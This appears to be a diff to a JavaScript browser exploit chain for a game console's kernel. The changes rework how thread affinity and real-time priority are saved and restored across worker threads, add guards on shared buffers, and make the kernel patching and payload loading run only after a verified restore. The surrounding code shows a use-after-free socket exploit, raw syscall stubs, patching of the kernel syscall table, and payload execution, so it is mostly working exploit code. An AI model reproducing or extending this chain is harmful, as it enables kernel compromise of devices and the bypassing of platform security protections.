@@ -117,6 +117,9 @@ let uafSock = 0;
 let uafFpSaved = null;
 
 let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;
+let attrsSaved = false, attrsRestoreInProgress = false;
+let workerBufState = 0;  // worker maskAb/prioAb: 0 free, 1 in use, 2 poisoned
+let mainRestoredOk = false;
 
 let allDone = false;
 
@@ -530,8 +533,11 @@ let allDone = false;
                 if (!slot) return;
                 pending.delete(d.id);
                 if (slot.timer) clearTimeout(slot.timer);
-                if (d.type === "err") slot.reject(new Error(String(d.value)));
-                else slot.resolve(d.value);
+                if (d.type === "err") {
+                    const err = new Error(String(d.value));
+                    err.fromWorker = true;
+                    slot.reject(err);
+                } else slot.resolve(d.value);
             };
             w.onerror = e => mark("WORKER-ONERROR", name + " "
                 + ((e && e.message) ? e.message : String(e)));
@@ -541,10 +547,22 @@ let allDone = false;
                     const id = seq++;
                     const timer = timeoutMs > 0 ? setTimeout(function () {
                         pending.delete(id);
-                        reject(new Error(name + ": timeout waiting for " + fname));
+                        const err = new Error(name + ": timeout waiting for " + fname);
+                        err.timedOut = true;
+                        reject(err);
                     }, timeoutMs) : null;
                     pending.set(id, { resolve, reject, timer });
-                    w.postMessage({ id: id, name: fname, args: args });
+                    try {
+                        w.postMessage({ id: id, name: fname, args: args });
+                    } catch (e) {
+                        // The request never reached the worker.
+                        pending.delete(id);
+                        if (timer) clearTimeout(timer);
+                        const err = new Error(name + ": postMessage failed: "
+                            + ((e && e.message) ? e.message : String(e)));
+                        err.notSent = true;
+                        reject(err);
+                    }
                 });
             };
         }
@@ -599,109 +617,430 @@ let allDone = false;
         mark("WORKER-POOLS", "iov=" + iovWorkers.length
             + " uio=" + uioWorkers.length);
 
+        // Worker buffers (shared by all workers only).
         const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
-        keepAlive.push(prioAb, maskAb);
+        // Main-thread buffers (never shared with a worker).
+        const mainPrioAb = new ArrayBuffer(8), mainMaskAb = new ArrayBuffer(0x10);
+        keepAlive.push(prioAb, maskAb, mainPrioAb, mainMaskAb);
         const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
         const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);
+        const mainPrioAddr = bufAddr(mainPrioAb);
+        const mainMaskAddr = bufAddr(mainMaskAb);
+        const mainPrioDv = new DataView(mainPrioAb);
+        const mainMaskDv = new DataView(mainMaskAb);
 
-        new Uint8Array(maskAb).fill(0);
-        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
-            new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
-        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
-        prioDv.setUint16(0, 0xffff, true);
-        prioDv.setUint16(2, 0xffff, true);
-        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
-        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
+        // Worker buffers only. A rejected RPC does NOT cancel the syscall
+        // running inside the worker, so once any worker use is unresolved the
+        // worker buffers must never be touched again (state 2 is sticky).
+        // The main thread has its own buffers and is never blocked by this.
+        function workerBufBegin(who) {
+            if (workerBufState !== 0) {
+                mark("WORKER-BUF-REFUSED", "who=" + who
+                    + " state=" + workerBufState);
+                return false;
+            }
+            workerBufState = 1;
+            return true;
+        }
+        function workerBufEnd() {
+            if (workerBufState === 1) workerBufState = 0;
+        }
+        function workerBufPoison(who) {
+            if (workerBufState !== 2) {
+                workerBufState = 2;
+                mark("WORKER-BUF-POISONED", "who=" + who);
+            }
+        }
+
+        // Main-thread save uses ONLY the main buffers and no worker guard.
+        let saveMaskRc = -1, savePrioRc = -1;
+        let saveMask = null, savePrio = null;
+        try {
+            new Uint8Array(mainMaskAb).fill(0);
+            const SAVE_ID = new int64(0xffffffff, 0xffffffff);
+            saveMaskRc = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH,
+                CPU_WHICH_TID, SAVE_ID, 0x10, mainMaskAddr).i32;
+            saveMask = new int64(mainMaskDv.getUint32(0, true),
+                                 mainMaskDv.getUint32(4, true));
+            mainPrioDv.setUint16(0, 0xffff, true);
+            mainPrioDv.setUint16(2, 0xffff, true);
+            savePrioRc = sc(SYS.rtprio_thread, RTP_LOOKUP, 0, mainPrioAddr).i32;
+            savePrio = [mainPrioDv.getUint16(0, true),
+                        mainPrioDv.getUint16(2, true)];
+        } catch (e) {
+            mark("THREAD-ATTRS-SAVE-THREW",
+                (e && e.message) ? e.message : String(e));
+        }
+        attrsSaved = saveMaskRc === 0 && savePrioRc === 0
+            && saveMask !== null && savePrio !== null
+            && (saveMask.low !== 0 || saveMask.hi !== 0)
+            && savePrio[0] !== 0xffff && savePrio[1] !== 0xffff;
+        if (!attrsSaved) {
+            mark("THREAD-ATTRS-SAVE-FAILED", "mask-rc=" + saveMaskRc
+                + " prio-rc=" + savePrioRc + " mask=" + saveMask
+                + " prio={" + savePrio + "}");
+            state("THREAD ATTRS SAVE FAILED -- ABORTING", "bad");
+            return;
+        }
+        savedMask = saveMask;
+        savedPrio = savePrio;
 
         async function restoreThreadAttrs(why) {
-            if (attrsRestored || !savedMask || !savedPrio) return;
-            attrsRestored = true;
-            const ID = new int64(0xffffffff, 0xffffffff);
-
-            // MAIN THREAD FIRST. attrsRestored is latched at the top of this
-            // function, so a death anywhere below leaves main realtime-256 on
-            // MAIN_CORE AND makes the finally's retry a permanent no-op -- the
-            // console then refuses to power off. The 16 worker RPCs used to run
-            // first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
-            // nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
-            // thread and never touches a worker; we cannot copy that (our
-            // workers outlive the page) but we can copy the ordering.
-            // Widen affinity before dropping priority, never the reverse.
-            new Uint8Array(maskAb).fill(0);
-            maskDv.setUint32(0, savedMask.low, true);
-            maskDv.setUint32(4, savedMask.hi, true);
-            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
-                CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
-            prioDv.setUint16(0, savedPrio[0], true);
-            prioDv.setUint16(2, savedPrio[1], true);
-            const pr = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
-
-            new Uint8Array(maskAb).fill(0);
-            sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
-                ID, 0x10, maskAddr);
-            const backMask = new int64(maskDv.getUint32(0, true),
-                                       maskDv.getUint32(4, true));
-            prioDv.setUint16(0, 0xffff, true);
-            prioDv.setUint16(2, 0xffff, true);
-            sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
-            const backPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];
-            const good = backMask.low === savedMask.low
-                && backMask.hi === savedMask.hi
-                && backPrio[0] === savedPrio[0] && backPrio[1] === savedPrio[1];
-            mark("THREAD-ATTRS-RESTORED", "at=" + why + " affinity=" + ar
-                + " rtprio=" + pr + " mask=" + backMask
-                + " prio={" + backPrio + "} wanted=" + savedMask
-                + " {" + savedPrio + "}");
-            check("thread-attrs-restored-power-off-safe", good, "");
-
-            // Workers last, reported separately. By here main is already
-            // restored AND verified, so if these 16 RPCs never come back the
-            // console can still be shut down normally.
-            let wr = 0, wn = 0;
-            for (const w of workers) {
-                try {
-                    if (!w.armed) continue;
-                    wn++;
-                    new Uint8Array(maskAb).fill(0xff);
-                    await fireW(w, SYS.cpuset_setaffinity,
-                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 5000);
-                    prioDv.setUint16(0, RTP_PRIO_NORMAL, true);
-                    prioDv.setUint16(2, 0, true);
-                    await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr], 5000);
-                    wr++;
-                } catch (e) { }
+            if (attrsRestored)
+                return { notRequired: false, mainOk: true, workersOk: true };
+            if (attrsRestoreInProgress) return null;
+            if (!attrsSaved || !savedMask || !savedPrio)
+                return { notRequired: true, mainOk: false, workersOk: false };
+            attrsRestoreInProgress = true;
+            try {
+                return await restoreThreadAttrsInner(why);
+            } finally {
+                attrsRestoreInProgress = false;
             }
-            mark("WORKER-ATTRS-RESTORED", "at=" + why + " n=" + wr + "/" + wn);
+        }
+
+        async function restoreThreadAttrsInner(why) {
+            const ID = new int64(0xffffffff, 0xffffffff);
+            let mainOk = false;
+            let workersOk = workerBufState === 0;
+            let workersAttempted = 0, workersVerified = 0;
+            let workersNotPinned = 0;
+            if (!workersOk) {
+                // A worker RPC is unresolved (timeout or busy) and the worker
+                // buffers are poisoned. This is NOT a per-worker restore
+                // failure: it is an unresolved operation. Main restore stays
+                // independent, but kpatch/payload must be blocked.
+                mark("WORKER-ATTRS-UNRESOLVED", "at=" + why
+                    + " reason=worker-buffers-poisoned state="
+                    + workerBufState);
+            }
+
+            // MAIN THREAD FIRST. A failure below must leave attrsRestored
+            // false so the finally can retry: leaving main realtime-256 on
+            // MAIN_CORE is what makes the console refuse to power off.
+            // Widen affinity before dropping priority, never the reverse.
+            if (mainRestoredOk) {
+                mainOk = true;
+            } else {
+                // Main-thread restore uses mainMaskAb/mainPrioAb only and is
+                // independent of the worker guard: a wedged worker must never
+                // prevent main from being restored.
+                try {
+                    new Uint8Array(mainMaskAb).fill(0);
+                    mainMaskDv.setUint32(0, savedMask.low, true);
+                    mainMaskDv.setUint32(4, savedMask.hi, true);
+                    const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
+                        CPU_WHICH_TID, ID, 0x10, mainMaskAddr).i32;
+                    mainPrioDv.setUint16(0, savedPrio[0], true);
+                    mainPrioDv.setUint16(2, savedPrio[1], true);
+                    const pr = sc(SYS.rtprio_thread, RTP_SET, 0, mainPrioAddr).i32;
+
+                    new Uint8Array(mainMaskAb).fill(0);
+                    const rmRc = sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH,
+                        CPU_WHICH_TID, ID, 0x10, mainMaskAddr).i32;
+                    const backMask = new int64(mainMaskDv.getUint32(0, true),
+                                               mainMaskDv.getUint32(4, true));
+                    mainPrioDv.setUint16(0, 0xffff, true);
+                    mainPrioDv.setUint16(2, 0xffff, true);
+                    const rpRc = sc(SYS.rtprio_thread, RTP_LOOKUP, 0, mainPrioAddr).i32;
+                    const backPrio = [mainPrioDv.getUint16(0, true),
+                                      mainPrioDv.getUint16(2, true)];
+                    mainOk = ar === 0 && pr === 0 && rmRc === 0 && rpRc === 0
+                        && backMask.low === savedMask.low
+                        && backMask.hi === savedMask.hi
+                        && backPrio[0] === savedPrio[0]
+                        && backPrio[1] === savedPrio[1];
+                    mark("THREAD-ATTRS-RESTORED", "at=" + why
+                        + " main-ok=" + (mainOk ? 1 : 0)
+                        + " affinity=" + ar + " rtprio=" + pr
+                        + " read-mask=" + rmRc + " read-prio=" + rpRc
+                        + " mask=" + backMask + " prio={" + backPrio
+                        + "} wanted=" + savedMask + " {" + savedPrio + "}");
+                    check("thread-attrs-restored-power-off-safe", mainOk, "");
+                } catch (e) {
+                    mainOk = false;
+                    mark("THREAD-ATTRS-RESTORE-MAIN-THREW",
+                        (e && e.message) ? e.message : String(e));
+                }
+                if (mainOk) mainRestoredOk = true;
+            }
+
+            // Workers last, each against its OWN saved values. A successful
+            // RPC only means the syscall ran: the values are read back and
+            // compared before the worker is called restored.
+            for (const w of workers) {
+                if (!w.pinAttempt) {
+                    if (w.saveOk === false) {
+                        // Never pinned because its attrs were never proven:
+                        // this is NOT the same as a failed restore.
+                        workersNotPinned++;
+                        mark("WORKER-ATTRS-NOT-PINNED", "at=" + why
+                            + " name=" + w.name
+                            + " reason=save-failed-never-pinned");
+                    }
+                    continue;
+                }
+                workersAttempted++;
+                if (w.restoredOk) { workersVerified++; continue; }
+                try {
+                    if (!w.saveOk || !w.savedMask || !w.savedPrio) {
+                        workersOk = false;
+                        mark("WORKER-ATTRS-UNVERIFIED", "at=" + why
+                            + " name=" + w.name + " reason=save-unverified");
+                        continue;
+                    }
+                    const wa = await fireWorkerAttr(w, SYS.cpuset_setaffinity,
+                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 5000,
+                        function () {
+                            new Uint8Array(maskAb).fill(0);
+                            maskDv.setUint32(0, w.savedMask.low, true);
+                            maskDv.setUint32(4, w.savedMask.hi, true);
+                        },
+                        function () { return w.ctx.frameDv.getInt32(0, true); });
+                    const wp = await fireWorkerAttr(w, SYS.rtprio_thread,
+                        [RTP_SET, 0, prioAddr], 5000, function () {
+                            prioDv.setUint16(0, w.savedPrio[0], true);
+                            prioDv.setUint16(2, w.savedPrio[1], true);
+                        },
+                        function () { return w.ctx.frameDv.getInt32(0, true); });
+
+                    const vMask = await fireWorkerAttr(w, SYS.cpuset_getaffinity,
+                        [CPU_LEVEL_WHICH, CPU_WHICH_TID, ID, 0x10, maskAddr], 5000,
+                        function () { new Uint8Array(maskAb).fill(0); },
+                        function () {
+                            return {
+                                rc: w.ctx.frameDv.getInt32(0, true),
+                                mask: new int64(maskDv.getUint32(0, true),
+                                                maskDv.getUint32(4, true))
+                            };
+                        });
+                    const vPrio = await fireWorkerAttr(w, SYS.rtprio_thread,
+                        [RTP_LOOKUP, 0, prioAddr], 5000, function () {
+                            prioDv.setUint16(0, 0xffff, true);
+                            prioDv.setUint16(2, 0xffff, true);
+                        },
+                        function () {
+                            return {
+                                rc: w.ctx.frameDv.getInt32(0, true),
+                                prio: [prioDv.getUint16(0, true),
+                                       prioDv.getUint16(2, true)]
+                            };
+                        });
+                    const wrm = vMask.rc;
+                    const wBackMask = vMask.mask;
+                    const wrp = vPrio.rc;
+                    const wBackPrio = vPrio.prio;
+                    const ok = wa === 0 && wp === 0 && wrm === 0 && wrp === 0
+                        && wBackMask.low === w.savedMask.low
+                        && wBackMask.hi === w.savedMask.hi
+                        && wBackPrio[0] === w.savedPrio[0]
+                        && wBackPrio[1] === w.savedPrio[1];
+                    if (ok) {
+                        w.restoredOk = true;
+                        workersVerified++;
+                    } else {
+                        workersOk = false;
+                        mark("WORKER-ATTRS-UNRESTORED", "at=" + why
+                            + " name=" + w.name + " affinity=" + wa
+                            + " rtprio=" + wp + " read-mask=" + wrm
+                            + " read-prio=" + wrp
+                            + " mask=" + wBackMask + " prio={" + wBackPrio
+                            + "} wanted=" + w.savedMask + " {" + w.savedPrio + "}");
+                    }
+                } catch (e) {
+                    workersOk = false;
+                    mark("WORKER-ATTRS-RESTORE-THREW", "at=" + why
+                        + " name=" + w.name + " "
+                        + ((e && e.message) ? e.message : String(e)));
+                }
+            }
+            mark("WORKER-ATTRS-RESTORED", "at=" + why + " verified="
+                + workersVerified + "/" + workersAttempted
+                + " not_pinned=" + workersNotPinned
+                + " ok=" + (workersOk ? 1 : 0));
+            attrsRestored = mainOk && workersOk;
+            return { notRequired: false, mainOk: mainOk, workersOk: workersOk };
         }
 
         restoreCtx = { restore: restoreThreadAttrs };
         mark("THREAD-ATTRS-SAVED", "mask=" + savedMask
             + " rtprio={" + savedPrio + "}");
-        prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
-        prioDv.setUint16(2, RTP, true);
-        new Uint8Array(maskAb).fill(0);
-        maskDv.setUint32(0, 1 << MAIN_CORE, true);
-
-        {
+        try {
+            mainPrioDv.setUint16(0, RTP_PRIO_REALTIME, true);
+            mainPrioDv.setUint16(2, RTP, true);
+            new Uint8Array(mainMaskAb).fill(0);
+            mainMaskDv.setUint32(0, 1 << MAIN_CORE, true);
             const a = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
-                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr).i32;
-            const r = sc(SYS.rtprio_thread, RTP_SET, 0, prioAddr).i32;
+                new int64(0xffffffff, 0xffffffff), 0x10, mainMaskAddr).i32;
+            const r = sc(SYS.rtprio_thread, RTP_SET, 0, mainPrioAddr).i32;
             check("main-thread-pinned-realtime", a === 0 && r === 0,
                 "core=" + MAIN_CORE + " rtp=" + RTP
                 + " affinity=" + a + " rtprio=" + r);
+        } catch (e) {
+            mark("MAIN-PIN-THREW", (e && e.message) ? e.message : String(e));
         }
         function fireW(w, num, args, timeoutMs) {
-            layout(w.ctx, stubAddr.get(num), args);
-            return w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
+            // A rejected RPC does NOT cancel the syscall running inside the
+            // worker. Once a fire is outstanding, never reuse that worker:
+            // the shared ctx buffers would race with the in-flight call.
+            if (w.rpcBusy) {
+                const err = new Error(w.name + ": rpc still in flight");
+                err.busyRefused = true;
+                return Promise.reject(err);
+            }
+            try {
+                layout(w.ctx, stubAddr.get(num), args);
+            } catch (e) {
+                // layout failed before anything was sent; rpcBusy untouched.
+                const err = (e instanceof Error) ? e : new Error(String(e));
+                err.notSent = true;
+                throw err;
+            }
+            w.rpcBusy = true;
+            const p0 = w.rpc("fire", timeoutMs === undefined ? 15000 : timeoutMs,
                 w.ctx.S.low, w.ctx.S.hi);
+            p0.then(function () {
+                w.rpcBusy = false;
+            }, function (e) {
+                // Release only when the worker provably finished: a worker
+                // error reply, or a proven failure to send. A timeout leaves
+                // the request possibly running, so rpcBusy stays set.
+                if (e && (e.fromWorker || e.notSent))
+                    w.rpcBusy = false;
+            });
+            return p0;
         }
+        // Every worker RPC that touches maskAb/prioAb goes through here. The
+        // guard is global to the buffers: if a previous use timed out, that
+        // worker may still be writing them, so no other worker (or the main
+        // thread) may touch them. A worker-side error response means the
+        // worker answered and its syscall is over, so the buffers are safe.
+        async function fireWorkerAttr(w, num, args, timeoutMs, prep, collect) {
+            if (!workerBufBegin(w.name + ":" + num)) {
+                throw new Error(w.name + ": worker buffers unavailable");
+            }
+            try {
+                // Buffer writes happen only while the guard is held.
+                if (typeof prep === "function") prep();
+            } catch (e) {
+                // Nothing was sent yet.
+                workerBufEnd();
+                throw e;
+            }
+            let rpcDone = false;
+            try {
+                await fireW(w, num, args, timeoutMs);
+                rpcDone = true;
+                // Reads of the shared buffers also happen under the guard.
+                const out = (typeof collect === "function") ? collect() : undefined;
+                workerBufEnd();
+                return out;
+            } catch (e) {
+                if (rpcDone) {
+                    // The worker already finished; a local error in collect()
+                    // must not poison buffers that are provably safe.
+                    workerBufEnd();
+                    throw e;
+                }
+                // Release only on a worker reply or a proven send failure.
+                // Timeout / busy / anything uncertain poisons the buffers.
+                if (e && (e.fromWorker || e.notSent)) workerBufEnd();
+                else workerBufPoison(w.name + ":" + num);
+                throw e;
+            }
+        }
+        const PIN_ID = new int64(0xffffffff, 0xffffffff);
+        let pinAttempted = 0, pinVerified = 0, pinSaveFailed = 0;
         for (const w of workers) {
-            await fireW(w, SYS.cpuset_setaffinity, [CPU_LEVEL_WHICH, CPU_WHICH_TID,
-                new int64(0xffffffff, 0xffffffff), 0x10, maskAddr]);
-            await fireW(w, SYS.rtprio_thread, [RTP_SET, 0, prioAddr]);
+            // Capture this worker's own attrs before touching them: a
+            // restore target we never read is not a restore target.
+            let wMaskRc = -1, wMask = null;
+            try {
+                const r = await fireWorkerAttr(w, SYS.cpuset_getaffinity,
+                    [CPU_LEVEL_WHICH, CPU_WHICH_TID, PIN_ID, 0x10, maskAddr],
+                    15000, function () { new Uint8Array(maskAb).fill(0); },
+                    function () {
+                        return {
+                            rc: w.ctx.frameDv.getInt32(0, true),
+                            mask: new int64(maskDv.getUint32(0, true),
+                                            maskDv.getUint32(4, true))
+                        };
+                    });
+                wMaskRc = r.rc;
+                wMask = r.mask;
+            } catch (e) {
+                w.saveOk = false;
+                pinSaveFailed++;
+                mark("WORKER-ATTRS-SAVE-FAILED", "name=" + w.name + " "
+                    + ((e && e.message) ? e.message : String(e)));
+                continue;
+            }
+            let wPrioRc = -1, wPrio = null;
+            try {
+                const r = await fireWorkerAttr(w, SYS.rtprio_thread,
+                    [RTP_LOOKUP, 0, prioAddr], 15000, function () {
+                        prioDv.setUint16(0, 0xffff, true);
+                        prioDv.setUint16(2, 0xffff, true);
+                    },
+                    function () {
+                        return {
+                            rc: w.ctx.frameDv.getInt32(0, true),
+                            prio: [prioDv.getUint16(0, true),
+                                   prioDv.getUint16(2, true)]
+                        };
+                    });
+                wPrioRc = r.rc;
+                wPrio = r.prio;
+            } catch (e) {
+                w.saveOk = false;
+                pinSaveFailed++;
+                mark("WORKER-ATTRS-SAVE-FAILED", "name=" + w.name + " "
+                    + ((e && e.message) ? e.message : String(e)));
+                continue;
+            }
+            w.savedMask = wMask;
+            w.savedPrio = wPrio;
+            w.saveOk = wMaskRc === 0 && wPrioRc === 0
+                && (wMask.low !== 0 || wMask.hi !== 0)
+                && wPrio[0] !== 0xffff && wPrio[1] !== 0xffff;
+            if (!w.saveOk) {
+                pinSaveFailed++;
+                mark("WORKER-ATTRS-SAVE-UNVERIFIED", "name=" + w.name
+                    + " mask-rc=" + wMaskRc + " prio-rc=" + wPrioRc
+                    + " mask=" + wMask + " prio={" + wPrio + "}");
+                continue;
+            }
+            w.pinAttempt = true;
+            pinAttempted++;
+            const pinAffRc = await fireWorkerAttr(w, SYS.cpuset_setaffinity,
+                [CPU_LEVEL_WHICH, CPU_WHICH_TID, PIN_ID, 0x10, maskAddr], 15000,
+                function () {
+                    new Uint8Array(maskAb).fill(0);
+                    maskDv.setUint32(0, 1 << MAIN_CORE, true);
+                },
+                function () { return w.ctx.frameDv.getInt32(0, true); });
+            const pinPrioRc = await fireWorkerAttr(w, SYS.rtprio_thread,
+                [RTP_SET, 0, prioAddr], 15000, function () {
+                    prioDv.setUint16(0, RTP_PRIO_REALTIME, true);
+                    prioDv.setUint16(2, RTP, true);
+                },
+                function () { return w.ctx.frameDv.getInt32(0, true); });
+            w.pinAffOk = pinAffRc === 0;
+            w.pinPrioOk = pinPrioRc === 0;
+            if (w.pinAffOk && w.pinPrioOk)
+                pinVerified++;
+            else
+                mark("WORKER-PIN-INCOMPLETE", "name=" + w.name
+                    + " affinity=" + pinAffRc + " rtprio=" + pinPrioRc);
         }
-        mark("WORKERS-PINNED", "n=" + workers.length + " core=" + MAIN_CORE
-            + " rtp=" + RTP);
+        if (pinAttempted === 0 && pinSaveFailed === 0)
+            mark("WORKERS-PIN-SKIPPED", "n=0");
+        else if (pinVerified === pinAttempted && pinSaveFailed === 0)
+            mark("WORKERS-PINNED", "n=" + pinAttempted
+                + " core=" + MAIN_CORE + " rtp=" + RTP);
+        else
+            mark("WORKERS-PIN-INCOMPLETE", "attempted=" + pinAttempted
+                + " verified=" + pinVerified + " save_failed=" + pinSaveFailed);
 
         function tagFor(i) { return (RTHDR_TAG | (i & 0xffff)) >>> 0; }
         function readTag() {
@@ -2143,11 +2482,34 @@ let allDone = false;
                             + (heldBack ? "  held_back_burned=" + heldBack : ""));
                     }
 
-                    await restoreThreadAttrs("cleanup");
+                    const threadsAtCleanup = await restoreThreadAttrs("cleanup");
+                    const threadsNotRequired = !!(threadsAtCleanup
+                        && threadsAtCleanup.notRequired);
+                    const mainThreadRestored = !!(threadsAtCleanup
+                        && threadsAtCleanup.mainOk);
+                    const threadsSafe = !!(threadsAtCleanup
+                        && !threadsNotRequired
+                        && threadsAtCleanup.mainOk
+                        && threadsAtCleanup.workersOk);
+                    if (!threadsSafe) {
+                        rebootRequired = true;
+                        if (!threadsAtCleanup) {
+                            mark("CHAIN-STOPPED",
+                                "reason=thread-restore-busy");
+                        } else if (!mainThreadRestored) {
+                            mark("CHAIN-STOPPED",
+                                "reason=main-thread-attrs-unrestored");
+                        } else {
+                            mark("CHAIN-STOPPED",
+                                "reason=worker-attrs-unrestored");
+                        }
+                        state("THREAD RESTORE UNVERIFIED -- REBOOT REQUIRED", "bad");
+                    }
 
 
                     let kpatched = false;
-                    if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
+                    if (threadsSafe && jailbroken && kpatch
+                        && KPATCH_JMP_SITES.length >= 4) {
                         state("kernel patches...", "warn");
                         const SYSENT_NARG = 0, SYSENT_CALL = 8, SYSENT_THRCNT = 0x2c;
                         const sysent = kernelBase.add32(off.k_sysent_661);
@@ -2258,7 +2620,8 @@ let allDone = false;
                     }
 
                     let payloadRunning = false;
-                    if (payload && (kpatched || params.get("payload") === "1")
+                    if (threadsSafe && payload
+                        && (kpatched || params.get("payload") === "1")
                         && params.get("payload") !== "0") {
                         state("payload...", "warn");
                         const sz = (payload.length + 0x3fff) & ~0x3fff;
@@ -2457,7 +2820,19 @@ let allDone = false;
         if (uafSock) mark("UAF-SOCK-LEFT-OPEN", "fd=" + uafSock);
 
         try {
-            if (restoreCtx) await restoreCtx.restore("finally");
+            if (restoreCtx) {
+                const rr = await restoreCtx.restore("finally");
+                if (rr && rr.mainOk === false) {
+                    rebootRequired = true;
+                    mark("THREAD-ATTRS-RESTORE-FINAL-FAILED",
+                        "main thread attrs still unverified at exit");
+                }
+                if (rr && rr.workersOk === false) {
+                    rebootRequired = true;
+                    mark("WORKER-ATTRS-RESTORE-FINAL-FAILED",
+                        "worker attrs still unverified at exit");
+                }
+            }
         } catch (e) { mark("THREAD-ATTRS-RESTORE-THREW", e.message); }
         for (const w of workers) {
             try { if (w.armed) { await w.rpc("disarm", 5000); w.armed = false; } }
